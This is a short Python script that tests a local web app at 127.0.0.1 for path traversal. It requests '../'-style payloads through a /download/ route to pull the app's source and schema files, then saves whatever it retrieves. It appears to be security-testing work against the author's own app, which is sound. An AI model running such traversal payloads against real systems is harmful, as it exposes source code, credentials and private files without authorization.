import requests

# Test Path Traversal attacks
base_url = "http://127.0.0.1:5000"

payloads = [
    "../schema.sql",
    "../../app/auth.py",
    "../../app/__init__.py",
    "../../app/db.py",
]

print("🔴 Testing Path Traversal Vulnerability...")
print("=" * 60)

for payload in payloads:
    url = f"{base_url}/download/{payload}"
    print(f"\n📝 Testing: {url}")
    
    try:
        response = requests.get(url)
        
        if response.status_code == 200:
            print(f"   ✅ SUCCESS! Downloaded {len(response.content)} bytes")
            print(f"   Preview: {response.text[:100]}...")
            
            # Save file
            filename = payload.split('/')[-1]
            with open(f"downloaded_{filename}", 'wb') as f:
                f.write(response.content)
            print(f"   💾 Saved as: downloaded_{filename}")
        else:
            print(f"   ❌ Failed: Status {response.status_code}")
    except Exception as e:
        print(f"   ❌ Error: {e}")

print("\n" + "=" * 60)
print("✅ Path Traversal test completed!")